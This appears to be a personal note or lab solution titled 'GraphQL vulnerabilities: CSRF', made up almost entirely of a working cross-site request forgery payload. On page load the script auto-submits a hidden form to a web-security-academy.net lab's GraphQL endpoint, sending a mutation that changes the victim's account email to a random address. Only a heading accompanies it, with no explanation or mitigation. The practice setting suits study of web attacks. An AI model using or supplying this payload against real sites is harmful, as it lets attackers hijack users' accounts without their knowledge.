GRAPHQL VULNERABILITIES:

CSRF:

<script>
document.addEventListener("DOMContentLoaded", () => {
const randomEmail = Math.random().toString(36).slice(2) + "@example.com";

const url = "https://0a400050030ca27780b30390003b008d.web-security-academy.net"

const form = document.createElement("form");
form.method = "POST";
form.action = `${url}/graphql/v1`;

const input = document.createElement("input");
input.type = "text";
input.name = "query";
input.value = `\n    mutation {\n        changeEmail(input: {email:\"${randomEmail}\"}) {\n            email\n        }\n    }\n` ;
form.appendChild(input);

document.body.appendChild(form);
form.submit();
});
</script>